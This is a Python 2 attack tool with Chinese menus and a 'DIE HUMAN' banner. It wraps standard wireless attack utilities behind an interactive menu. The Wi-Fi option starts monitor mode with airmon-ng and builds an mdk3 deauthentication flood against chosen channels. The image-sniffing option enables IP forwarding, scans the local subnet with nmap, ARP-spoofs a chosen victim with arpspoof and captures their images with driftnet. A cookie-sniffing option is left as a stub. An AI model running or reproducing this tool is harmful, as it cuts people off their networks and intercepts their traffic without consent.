#coding:utf-8
import os,sys,re,time,threading
class colors:
	red="\033[31m" 	# 红色字 
	redw="\033[41;37m"#红底白字 
	off="\033[0m"
menu="""
	玄学选项/菜单：
--------------------------
  1)嗅探		|
--------------------------
  2)断网		|
--------------------------
  3)嗅图		|
--------------------------
  4)退出		|
--------------------------

"""
def continueExe():
	cache=raw_input("回车继续...")
logo=colors.red+"""
           ,                                                     '
         .n                 '                   '                 n.
  ,    .dP                dP                    9b                 9b.   '
 4     qXb        ,      dX                      Xb       ,        dXp    t
dX,     9Xb     .dXb    __                         __    dXb.     dXP    ,Xb
9XXb,_       _.dXXXXn dXXXXbo.                 .odXXXXb dXXXXb._      _,dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXX0o.           .o0XXXXXXXXVXXXXXXXXXXXXXXXXXXP
  9XXXXXXXXXXXXXXXXXXXXXX'~   ~`0008b   d8000'~   ~`XXXXXXXXXXXXXXXXXXXXP'
   `9XXXXXXXXXXXP' `9XX'    """+colors.redw+"""DIE"""+colors.off+colors.red+"""    `98V8P'   """+colors.redw+"""HUMAN"""+colors.off+colors.red+"""  `XXP' `9XXXXXXXXXXXP'
       ~~~~~~~       9x,           .db|db.          ,XP       ~~~~~~~
                       )b.  .dbo,dP'`v'`9b.odb.   .dX(
                      ,dXXXXXXXXXXb          dXXXXXXXXb.
                      dXXXXXXXXXP'     .     `9XXXXXXXXXb
                     dXXXXXXXXXXb     d|b     dXXXXXXXXXXb
                     9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                      `'      9XXXXXX(   )XXXXXXP      `'
                               XXXX X `V'.X XXXX
                               XP X'`b   d'`X XX
                               X. 9         P )X
                               `b  `       '  d'
                                `             '

"""+colors.off
def exe(c):
	os.system(c)
def sniffCookie():
	print colors.red+"抱歉，这个模式由于开发者有点懒+暂时用不上也就没有编写;"+colors.off
	continueExe()
def disap():
	print """
    请确认：
    * 您需要断网的用户的信道<默认1-14>
    * 您的网卡已启动监听模式<由于我们启动这个
    可能会影响您的机器，所以由您手动开启>请确定以
    防止以下步骤出错...

    + 在此模式中如果您要使用默认项请输入“d”

	"""
	i=raw_input(colors.redw+"[+]确定已完成以上条件<Y/n>"+colors.off)
	if i=="n":
		return 0;
		exit()
	continueExe()
	NameOfInterface=raw_input(colors.redw+"[+]设备网卡名>"+colors.off)
	if NameOfInterface=="d":
		NameOfInterface="wlan0mon"
	ChNumber=raw_input(colors.redw+"[+]信道<多个用','隔开>"+colors.off)
	if ChNumber=="d":
			ChNumber="1,2,3,4,5,6,7,8,9,10,11,12,13,14"
	tts=raw_input(colors.redw+"[+]速率<默认3000>"+colors.off)
	if tts=="d":
		tts="3000"
	time.sleep(0.5)
	c="mdk3 "+NameOfInterface+" d "+"-c "+ChNumber+" -s "+tts
	os.system("reset")
	os.system("clear")
	print logo 
	print "您的攻击配置如下："
	print "目标信道: "+ChNumber
	print "攻击速率: "+tts
	print "------------------------------------------="
	i=raw_input(colors.redw+"[+]开始攻击<Y/n>"+colors.off)
	if i=="n":
		exit()

	os.system(c)
	print "\n[+]攻击已停止！"
	continueExe()
def SniffImage():
	os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
	os.system("route -n")
	route=raw_input(colors.redw+"Enter routeIP>"+colors.off)
	c="nmap -sS "+str(route)+"/24"
	os.system(c)
	target=raw_input(colors.redw+"Enter Target IP>"+colors.off)
	i=raw_input(colors.redw+"Enter interface>"+colors.off)
	c1="arpspoof -i "+i+" -t "+route+" "+target
	c2="driftnet -i "+i
	t1=threading.Thread(target=exe,args=(c1,))
	t1.start()
        os.system(c2)
def mod(x):
	if x==1:
		print menu
	choose=raw_input(colors.redw+"输入您的选择>"+colors.off)
	if choose=="1":
		x=sniffCookie()
	elif choose=="2":
		x=disap()
	elif choose=="3":
		x=SniffImage()
	elif choose=="4":
		x=0
	else:
		if choose=="exit":
			exit()
		else:
			print "错误！没有找到！请重试！"
			continueExe()
			return mod(0)
	return x;
def main(x):
	if x==0:
		exit()
	os.system("reset")
	os.system("clear")
	time.sleep(0.5)
	print logo
	time.sleep(0.5)
	print "[+]............OK"
	try:
		x=mod(1)
	except:
		time.sleep(0.5)
		print "[+]由于mod函数异常被终止！"
		continueExe()
	time.sleep(1)
	return main(x)


if __name__=="__main__":
	os.system("sudo airmon-ng start wlan0")
	try:

	    main(1)
	except:
		os.system("sudo airmon-ng stop wlan0mon 1>/dev/null 2>&1")
		print "[+]意外终止！已帮您关闭监听模式!"
